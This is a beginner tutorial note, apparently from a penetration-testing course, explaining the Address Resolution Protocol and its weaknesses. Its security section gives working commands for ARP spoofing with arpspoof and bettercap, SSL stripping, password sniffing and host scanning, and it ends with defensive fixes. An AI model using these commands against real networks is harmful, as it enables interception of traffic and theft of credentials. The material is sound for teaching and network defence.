---
tags: [vapt, foundations, networking, beginner]
difficulty: beginner
module: "01 - Foundations"
topic: "01.10 ARP — Address Resolution Protocol"
---

# 01.10 — ARP — Address Resolution Protocol

## What is it?

**ARP (Address Resolution Protocol)** answers the question: "I know the IP address — what is the MAC address?" ARP works at Layer 2 (Data Link) and is used for communication within the same local network segment.

**Analogy:** You know someone's apartment number (IP) but not their face (MAC). You shout down the hallway "Who lives in apartment 192.168.1.200?" and they respond with their face/identity (MAC).

---

## How ARP Works

```
PC wants to talk to Printer (192.168.1.200) on same LAN:

Step 1: PC checks its ARP cache
        No entry for 192.168.1.200 → needs to ask

Step 2: ARP Broadcast (sent to FF:FF:FF:FF:FF:FF — everyone)
        ┌─────────────────────────────────────────────────┐
        │  "Who has 192.168.1.200? Tell 192.168.1.100"   │
        │  Src MAC:  AA:BB:CC:DD:EE:FF (PC)              │
        │  Dst MAC:  FF:FF:FF:FF:FF:FF (broadcast)       │
        └─────────────────────────────────────────────────┘
        Everyone on the LAN receives this

Step 3: Only 192.168.1.200 responds (unicast reply)
        ┌─────────────────────────────────────────────────┐
        │  "192.168.1.200 is at 11:22:33:44:55:66"       │
        │  Src MAC:  11:22:33:44:55:66 (Printer)         │
        │  Dst MAC:  AA:BB:CC:DD:EE:FF (PC)              │
        └─────────────────────────────────────────────────┘

Step 4: PC updates ARP cache and sends data directly
        ARP Cache: 192.168.1.200 → 11:22:33:44:55:66
```

---

## ARP Cache

Every device maintains an ARP cache table to avoid asking every time.

```bash
# View ARP cache
arp -a                  # Linux, Windows, macOS
ip neigh show           # Modern Linux

# Sample output:
# 192.168.1.1    ether  c8:3a:35:xx:xx:xx  C  eth0   ← router
# 192.168.1.100  ether  ac:bc:32:xx:xx:xx  C  eth0   ← another PC
# 192.168.1.200  ether  11:22:33:xx:xx:xx  C  eth0   ← printer
```

Entries expire after a timeout (typically 2–20 minutes). ARP has **no authentication** — any device can claim any IP.

---

## ARP Packet Structure

```
ARP Request:
┌──────────────┬──────────────┬───────────┬───────────────────────┐
│ Hardware Type│Protocol Type │HW Addr Len│Protocol Addr Len│ Op  │
│  (Ethernet=1)│  (IPv4=0x800)│    6      │       4         │  1  │
├──────────────┴──────────────┴───────────┴─────────────────┴─────┤
│ Sender MAC Address (6 bytes)                                     │
├──────────────────────────────────────────────────────────────────┤
│ Sender IP Address (4 bytes)                                      │
├──────────────────────────────────────────────────────────────────┤
│ Target MAC Address (0:0:0:0:0:0 for request — unknown)          │
├──────────────────────────────────────────────────────────────────┤
│ Target IP Address (4 bytes)                                      │
└──────────────────────────────────────────────────────────────────┘

Op: 1 = Request, 2 = Reply
```

---

## Security Context — ARP in VAPT

### 1. ARP Spoofing / ARP Poisoning — MITM Attack

ARP has NO authentication. Any device can send a fake ARP reply claiming any IP. This is the foundation of most LAN-based attacks.

```
NORMAL ARP TABLE on victim PC:
192.168.1.1 (router) → cc:cc:cc:cc:cc:cc

ATTACK:
Attacker sends gratuitous ARP (unsolicited reply):
"192.168.1.1 is at aa:aa:aa:aa:aa:aa (attacker's MAC)"

POISONED ARP TABLE on victim PC:
192.168.1.1 (router) → aa:aa:aa:aa:aa:aa ← now points to attacker!

Traffic flow:
[Victim] ──→ [Attacker] ──→ [Router] ──→ Internet
              ↑ All traffic passes through attacker
              ↑ Attacker can read, modify, or drop packets
```

**Tool: arpspoof (dsniff suite)**
```bash
# Enable IP forwarding (otherwise you'll DoS the victim)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Tell victim that router's IP is at your MAC
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Tell router that victim's IP is at your MAC
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Now capture with Wireshark or tcpdump
tcpdump -i eth0 -w capture.pcap
```

**Tool: bettercap (modern, all-in-one)**
```bash
sudo bettercap -iface eth0

# Inside bettercap:
net.probe on                        # discover hosts
net.show                            # list discovered hosts
set arp.spoof.targets 192.168.1.100 # target specific host
arp.spoof on                        # start spoofing
net.sniff on                        # start sniffing
https.proxy on                      # HTTPS downgrade/intercept
```

**What you can capture:**
- HTTP credentials (cleartext)
- FTP credentials (cleartext)
- HTTP cookies and session tokens
- DNS queries (who they're visiting)
- SMTP email content (if unencrypted)

### 2. Gratuitous ARP — Updating Caches Without Being Asked

A **gratuitous ARP** is an ARP reply sent without a preceding request. Devices use this to:
- Announce themselves when joining a network
- Update caches after MAC change (e.g., virtual IP failover)

Attackers abuse this: send gratuitous ARP to poison caches without waiting for a request.

```bash
# Send gratuitous ARP with arping
arping -U -I eth0 -c 3 192.168.1.1
# Tells everyone: "192.168.1.1 is at my MAC address"
```

### 3. ARP Scanning — Discover Live Hosts

ARP-based scanning is faster and more reliable than ICMP ping on local networks (firewalls block ping, but ARP is required for LAN communication).

```bash
# arp-scan — very fast LAN discovery
sudo arp-scan -l                    # scan local network
sudo arp-scan 192.168.1.0/24       # specific subnet
sudo arp-scan --interface=eth0 -l

# Output:
# 192.168.1.1    c8:3a:35:xx:xx:xx    Tenda Technology  ← router brand!
# 192.168.1.100  ac:bc:32:xx:xx:xx    Apple            ← Mac device
# 192.168.1.200  00:50:56:xx:xx:xx    VMware           ← VM target!

# Nmap ARP scan (on local network, requires root)
sudo nmap -sn 192.168.1.0/24
# Uses ARP requests on local subnet automatically

# netdiscover — passive ARP monitoring + active scan
sudo netdiscover -i eth0 -r 192.168.1.0/24
sudo netdiscover -i eth0            # passive mode — just listen for ARP
```

### 4. ARP Spoofing for SSL Stripping

Combine ARP spoofing with SSL stripping to downgrade HTTPS to HTTP:

```
[Victim] → http:// ← Attacker downgrades HTTPS
[Attacker] → https:// → [Real Server]

Victim thinks they're on HTTP, attacker reads all traffic.
```

```bash
# bettercap with SSL stripping
bettercap -iface eth0
set arp.spoof.targets 192.168.1.100
arp.spoof on
set net.sniff.regexp .*password.*
net.sniff on
```

---

## Hands-On: ARP Commands

```bash
# View ARP cache
arp -a
ip neigh show

# Delete an ARP entry (force re-resolution)
arp -d 192.168.1.1
ip neigh del 192.168.1.1 dev eth0

# Add a static ARP entry (prevents poisoning for this entry)
arp -s 192.168.1.1 cc:cc:cc:cc:cc:cc
ip neigh add 192.168.1.1 lladdr cc:cc:cc:cc:cc:cc dev eth0 nud permanent

# Capture ARP traffic
tcpdump -i eth0 -n arp
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| ARP spoofing MITM | Enable Dynamic ARP Inspection (DAI) on managed switches |
| ARP spoofing MITM | Use 802.1X port authentication — only known devices allowed |
| ARP cache poisoning | Add static ARP entries for critical devices (gateway, DNS) |
| Cleartext capture after MITM | Use TLS everywhere — even if intercepted, data is encrypted |
| ARP-based DoS | Rate-limit ARP on switches |

---

## Related Notes
- [[03 - MAC Addresses]] — what MAC addresses are
- [[02 - IP Addresses]] — IP addressing
- [[Module 35 - Network Protocol Attacks]] — ARP spoofing attacks
- [[Module 48 - Wireless Security]] — ARP attacks on Wi-Fi
